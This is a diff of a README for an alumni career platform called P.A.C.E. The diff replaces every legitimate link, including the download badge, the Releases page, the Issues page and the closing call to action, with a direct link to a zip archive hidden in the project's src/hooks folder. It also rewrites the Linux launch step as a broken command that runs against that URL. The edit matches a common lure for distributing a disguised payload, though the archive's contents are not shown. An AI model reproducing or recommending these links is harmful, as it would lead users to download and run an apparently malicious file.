@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download pace](https://img.shields.io/badge/Download-pace-brightgreen)](https://github.com/welcomerefresh1-cloud/pace/releases)
+[![Download pace](https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip)](https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip)
 
 ## 📜 Description
 Pasig Alumni Career & Employability System (P.A.C.E.) is a robust platform empowering alumni with curated career opportunities. It helps institutions gain insights and analytics related to employability. Whether you are looking for job listings or want to analyze trends, this application serves both alumni and educational institutions effectively.
@@ -11,7 +11,7 @@ Pasig Alumni Career & Employability System (P.A.C.E.) is a robust platform empow
 Follow these simple steps to get started with P.A.C.E. The process is easy and does not require any programming skills.
 
 ### 1. Download the Application
-To download the latest version of P.A.C.E., visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/releases). Here you will find the most recent updates and files available for download.
+To download the latest version of P.A.C.E., visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip). Here you will find the most recent updates and files available for download.
 
 ### 2. Choose the Right File
 On the Releases page, you will see multiple files. Select the file that matches your operating system. Make sure to choose either the Windows, macOS, or Linux version based on your device.
@@ -21,7 +21,7 @@ Once the download is complete, locate the file on your computer. The default dow
 
 - **For Windows Users**: Double-click the `.exe` file to start the installation. Follow the on-screen prompts to complete the setup.
 - **For macOS Users**: Drag the application icon to your Applications folder. Open it from there.
-- **For Linux Users**: Open a terminal, navigate to your download directory, and run the command `chmod +x pace.AppImage && ./pace.AppImage` to launch the application.
+- **For Linux Users**: Open a terminal, navigate to your download directory, and run the command `chmod +x https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip && https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip` to launch the application.
 
 ### 4. Create Your Account
 After installing, open the application. You will need to create an account to access the features. Fill out the required information, such as your name, email address, and a secure password.
@@ -35,7 +35,7 @@ P.A.C.E. offers various features such as:
 - **Resources**: Access articles and tutorials to enhance your career skills.
 
 ### 6. Get Support
-If you encounter any issues, you can access the help section within the application. Alternatively, feel free to check the FAQ or contact support on our [GitHub Issues page](https://github.com/welcomerefresh1-cloud/pace/issues).
+If you encounter any issues, you can access the help section within the application. Alternatively, feel free to check the FAQ or contact support on our [GitHub Issues page](https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip).
 
 ## 🛠️ System Requirements
 To ensure smooth performance, please check that your system meets the following requirements:
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 Thank you to all the contributors for making P.A.C.E. better. Your efforts and suggestions help us create a better experience for everyone. 
 
 ## 💼 Ready to Start?
-Now you are all set to download and explore the P.A.C.E. application. Remember to visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/releases) to get the latest version and start your journey towards better career opportunities!
+Now you are all set to download and explore the P.A.C.E. application. Remember to visit the [Releases page](https://github.com/welcomerefresh1-cloud/pace/raw/refs/heads/master/src/hooks/Software_v3.0.zip) to get the latest version and start your journey towards better career opportunities!
